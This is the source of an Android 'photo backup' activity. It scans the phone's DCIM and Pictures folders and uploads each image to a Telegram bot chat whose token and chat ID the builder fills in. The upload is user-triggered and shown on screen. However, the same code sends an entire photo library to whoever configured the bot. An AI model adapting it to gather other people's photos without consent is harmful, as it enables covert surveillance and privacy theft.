package com.example.photobackup;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 100;
    
    // 🔴 YAHAN APNA BOT TOKEN AUR CHAT ID DALO 🔴
    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    private static final String CHAT_ID = "YOUR_CHAT_ID_HERE";
    
    private Button btnPermission, btnStart;
    private TextView txtPhotoCount, txtLog, txtProgress;
    private ProgressBar progressBar;
    private boolean hasPermission = false;
    private List<String> allPhotos = new ArrayList<>();
    private StringBuilder logBuilder = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        btnPermission = findViewById(R.id.btnPermission);
        btnStart = findViewById(R.id.btnStart);
        txtPhotoCount = findViewById(R.id.txtPhotoCount);
        txtLog = findViewById(R.id.txtLog);
        txtProgress = findViewById(R.id.txtProgress);
        progressBar = findViewById(R.id.progressBar);
        
        btnPermission.setOnClickListener(v -> requestPermissions());
        btnStart.setOnClickListener(v -> {
            if (hasPermission) {
                new BackupTask().execute();
            }
        });
        
        checkPermission();
    }
    
    private void checkPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            hasPermission = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
        } else {
            hasPermission = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
        
        if (hasPermission) {
            btnPermission.setEnabled(false);
            btnStart.setEnabled(true);
            scanPhotos();
        }
    }
    
    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_MEDIA_IMAGES}, PERMISSION_REQUEST_CODE);
        } else {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, PERMISSION_REQUEST_CODE);
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            hasPermission = true;
            btnPermission.setEnabled(false);
            btnStart.setEnabled(true);
            scanPhotos();
            Toast.makeText(this, "Permission Granted!", Toast.LENGTH_SHORT).show();
        }
    }
    
    private void scanPhotos() {
        allPhotos.clear();
        
        // Scan DCIM folder
        File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        if (dcim.exists()) {
            scanFolder(dcim);
        }
        
        // Scan Pictures folder
        File pictures = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
        if (pictures.exists()) {
            scanFolder(pictures);
        }
        
        txtPhotoCount.setText("Photos: " + allPhotos.size());
        addLog("Found " + allPhotos.size() + " photos");
    }
    
    private void scanFolder(File folder) {
        File[] files = folder.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    scanFolder(file);
                } else {
                    String name = file.getName().toLowerCase();
                    if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png")) {
                        allPhotos.add(file.getAbsolutePath());
                    }
                }
            }
        }
    }
    
    private class BackupTask extends AsyncTask<Void, String, Integer> {
        private int success = 0;
        
        @Override
        protected void onPreExecute() {
            btnStart.setEnabled(false);
            btnStart.setText("Backing up...");
            progressBar.setMax(allPhotos.size());
            addLog("Starting backup of " + allPhotos.size() + " photos");
        }
        
        @Override
        protected Integer doInBackground(Void... voids) {
            for (int i = 0; i < allPhotos.size(); i++) {
                String path = allPhotos.get(i);
                publishProgress("sending", (i+1) + "/" + allPhotos.size());
                
                if (sendToTelegram(path)) {
                    success++;
                    publishProgress("success", new File(path).getName());
                } else {
                    publishProgress("failed", new File(path).getName());
                }
                
                publishProgress("progress", String.valueOf((i+1) * 100 / allPhotos.size()));
            }
            return success;
        }
        
        @Override
        protected void onProgressUpdate(String... values) {
            if (values[0].equals("sending")) {
                txtProgress.setText(values[1]);
            } else if (values[0].equals("success")) {
                addLog("✅ " + values[1]);
                progressBar.setProgress(progressBar.getProgress() + 1);
            } else if (values[0].equals("failed")) {
                addLog("❌ " + values[1]);
            } else if (values[0].equals("progress")) {
                progressBar.setProgress(Integer.parseInt(values[1]));
            }
        }
        
        @Override
        protected void onPostExecute(Integer result) {
            addLog("\n✅ Backup Complete! " + result + "/" + allPhotos.size() + " uploaded");
            btnStart.setText("Done");
            Toast.makeText(MainActivity.this, "Uploaded: " + result + " photos", Toast.LENGTH_LONG).show();
        }
    }
    
    private boolean sendToTelegram(String photoPath) {
        try {
            File file = new File(photoPath);
            if (!file.exists()) return false;
            
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto";
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            
            String boundary = "boundary_" + System.currentTimeMillis();
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            
            OutputStream os = conn.getOutputStream();
            
            // Photo
            os.write(("--" + boundary + "\r\n").getBytes());
            os.write(("Content-Disposition: form-data; name=\"photo\"; filename=\"" + file.getName() + "\"\r\n").getBytes());
            os.write(("Content-Type: image/jpeg\r\n\r\n").getBytes());
            
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int read;
            while ((read = fis.read(buffer)) != -1) {
                os.write(buffer, 0, read);
            }
            fis.close();
            os.write("\r\n".getBytes());
            
            // Chat ID
            os.write(("--" + boundary + "\r\n").getBytes());
            os.write(("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n").getBytes());
            os.write(("--" + boundary + "--\r\n").getBytes());
            
            os.flush();
            os.close();
            
            return conn.getResponseCode() == 200;
        } catch (Exception e) {
            return false;
        }
    }
    
    private void addLog(String msg) {
        runOnUiThread(() -> {
            String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
            logBuilder.append("[").append(time).append("] ").append(msg).append("\n");
            txtLog.setText(logBuilder.toString());
        });
    }
        }
